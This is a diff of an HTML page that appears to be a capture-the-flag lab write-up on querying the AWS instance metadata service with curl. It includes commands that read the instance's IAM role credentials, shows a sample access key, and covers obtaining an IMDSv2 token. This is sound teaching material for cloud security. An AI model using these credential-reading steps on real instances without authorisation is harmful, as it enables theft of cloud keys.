-<pre><code>The instance identity document can be used by developers to understand the instance
+  <pre><code>The instance identity document can be used by developers to understand the instance
 details.
 Repeat the request, this time requesting the instance-identity/document resource:
 'curl http://169.254.169.254/latest/dynamic/instance-identity/document'.
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254/latest/dynamic/instance-identity/document
+  <pre><code class="bash">curl http://169.254.169.254/latest/dynamic/instance-identity/document
 </code></pre>
 
-<pre><code>Much of the data retrieved from IMDS will be returned in JavaScript Object Notation (JSON)
+  <pre><code>Much of the data retrieved from IMDS will be returned in JavaScript Object Notation (JSON)
 format. Piping the output to 'jq' will make the content easier to read.
 Re-run the previous command, sending the output to JQ: 'curl
 http://169.254.169.254/latest/dynamic/instance-identity/document | jq'
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq
+  <pre><code class="bash">curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq
 </code></pre>
 
-<pre><code>Here we see several details about the instance when it was launched. Developers can use this
+  <pre><code>Here we see several details about the instance when it was launched. Developers can use this
 information to optimize applications based on the instance launch parameters.
 Run 'next' to continue.
 </code></pre>
 
-<pre><code class="bash">next
+  <pre><code class="bash">next
 </code></pre>
 
-<pre><code>In addition to dynamic parameters set at launch, IMDS offers metadata about the instance as
+  <pre><code>In addition to dynamic parameters set at launch, IMDS offers metadata about the instance as
 well. Examine the metadata elements available:
 'curl http://169.254.169.254/latest/meta-data'
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254/latest/meta-data
+  <pre><code class="bash">curl http://169.254.169.254/latest/meta-data
 </code></pre>
 
-<pre><code>By accessing the metadata elements, a developer can interrogate information about the system.
+  <pre><code>By accessing the metadata elements, a developer can interrogate information about the system.
 Take a look at the public-hostname element:
 'curl http://169.254.169.254/latest/meta-data/public-hostname'
 </code></pre>
 
-<pre><code class="bash">Many of the data elements returned won't include a trailing newline, which causes the
+  <pre><code class="bash">Many of the data elements returned won't include a trailing newline, which causes the
 response to blend into the prompt. Re-run the prior command, adding '; echo' to the end of
 the command. This will add a new line character to the response.
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254/latest/meta-data/public-hostname; echo
+  <pre><code class="bash">curl http://169.254.169.254/latest/meta-data/public-hostname; echo
 
 ec2-192-0-2-54.compute-1.amazonaws.com
 </code></pre>
 
-<pre><code>There is a whole lot of information that can be retrieved from the IMDS server. Even AWS
+  <pre><code>There is a whole lot of information that can be retrieved from the IMDS server. Even AWS
 Identity and Access Management (IAM) credentials! Request the endpoint
 'http://169.254.169.254/latest/meta-data/iam/security-credentials' to see the instance IAM
 role.
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+  <pre><code class="bash">curl http://169.254.169.254/latest/meta-data/iam/security-credentials
 </code></pre>
 
-<pre><code>Once you know the role name, you can request the AWS keys associated with the role. Request
+  <pre><code>Once you know the role name, you can request the AWS keys associated with the role. Request
 the endpoint 'http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-
 role' to get the instance AWS keys.
 </code></pre>
 
-<pre><code class="bash">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role
+  <pre><code class="bash">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role
 {
         "AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
         "Code": "Success",
@@ -2391,55 +2469,55 @@ role' to get the instance AWS keys.
   }
 </code></pre>
 
-<pre><code>So far, we've been interacting with the IMDS server using IMDSv1, which does not require
+  <pre><code>So far, we've been interacting with the IMDS server using IMDSv1, which does not require
 authentication. Optionally, AWS users can turn on IMDSv2 that requires authentication. This
 is more secure, but not on by default.
 Run 'next' to continue.
 </code></pre>
 
-<pre><code class="bash">next
+  <pre><code class="bash">next
 </code></pre>
 
-<pre><code>For IMDSv2 access, you must request a token from the IMDS server using the
+  <pre><code>For IMDSv2 access, you must request a token from the IMDS server using the
 X-aws-ec2-metadata-token-ttl-seconds header to indicate how long you want the token to be
 used for (between 1 and 21,600 secods).
 Examine the contents of the 'gettoken.sh' script in the current directory using 'cat'.
 </code></pre>
 
-<pre><code class="bash">cat gettoken.sh
+  <pre><code class="bash">cat gettoken.sh
 
 TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
 </code></pre>
 
-<pre><code>This script will retrieve a token from the IMDS server and save it in the environment
+  <pre><code>This script will retrieve a token from the IMDS server and save it in the environment
 variable TOKEN. Import it into your environment by running 'source gettoken.sh'.
 </code></pre>
 
-I had to enter this twice:
-<pre><code class="bash">source gettoken.sh
+  <p>I had to enter this twice:</p>
+  <pre><code class="bash">source gettoken.sh
 </code></pre>
 
-<pre><code>Now, the IMDS token value is stored in the environment variable TOKEN. Examine the contents
+  <pre><code>Now, the IMDS token value is stored in the environment variable TOKEN. Examine the contents
 of the token by running 'echo $TOKEN'.
 </code></pre>
 
-<pre><code class="bash">echo $TOKEN
+  <pre><code class="bash">echo $TOKEN
 
 gYVa2GgdDYbR6R4AFnk5y2aU0sQirNIIoAcpOUh/aZk=
 </code></pre>
 
-<pre><code class="bash">With the IMDS token, you can make an IMDSv2 request by adding the X-aws-ec2-metadata-token
+  <pre><code class="bash">With the IMDS token, you can make an IMDSv2 request by adding the X-aws-ec2-metadata-token
 header to the curl request. Access the metadata region information in an
 IMDSv2 request: 'curl -H "X-aws-ec2-metadata-token: $TOKEN"
 http://169.254.169.254/latest/meta-data/placement/region'
 </code></pre>
 
-<pre><code class="bash">curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region
+  <pre><code class="bash">curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region
 
 🍬🍬🍬🍬Congratulations!🍬🍬🍬🍬
 You've completed the lesson on Instance Metadata interaction. Run 'exit' to close.
 </code></pre>
-</ip></host></host></host></host></some></some></code></pre>
+</blockquote>
 
             </div>
         </div>
